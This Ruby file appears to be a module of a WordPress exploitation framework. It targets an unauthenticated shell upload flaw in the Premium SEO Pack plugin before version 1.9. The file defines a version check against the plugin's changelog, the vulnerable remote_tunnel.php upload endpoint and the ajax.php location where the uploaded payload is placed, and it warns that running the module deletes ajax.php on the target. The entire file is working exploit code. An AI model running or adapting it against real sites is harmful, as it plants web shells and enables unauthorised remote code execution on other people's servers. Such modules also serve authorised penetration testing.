# frozen_string_literal: true

require_rel './woocommerce_amazon_affiliates_v8_shell_upload'

class Wpxf::Exploit::PremiumSeoPackShellUpload < Wpxf::Exploit::WoocommerceAmazonAffiliatesV8ShellUpload
  def initialize
    super

    update_info(
      name: 'Premium SEO Pack < v1.9 Unauthenticated Shell Upload',
      references: [
        ['WPVDB', '7934']
      ]
    )
  end

  def emit_usage_info
    emit_warning 'When executing this module, the ajax.php file in premium-seo-pack/modules/remote_support will be deleted. '\
                 'In order to be able to re-use this module on the same target, be sure to re-create ajax.php if ' \
                 'the selected payload is unable to re-create it automatically.'
  end

  def check
    readme = normalize_uri(wordpress_url_plugins, 'premium-seo-pack', 'changelog.txt')
    check_version_from_custom_file(readme, /##\s\[(\d\.\d(\.\d)*)\]/, '1.9')
  end

  def uploader_url
    normalize_uri(wordpress_url_plugins, 'premium-seo-pack', 'modules', 'remote_support', 'remote_tunnel.php')
  end

  def uploaded_payload_location
    normalize_uri(wordpress_url_plugins, 'premium-seo-pack', 'modules', 'remote_support', 'ajax.php')
  end
end
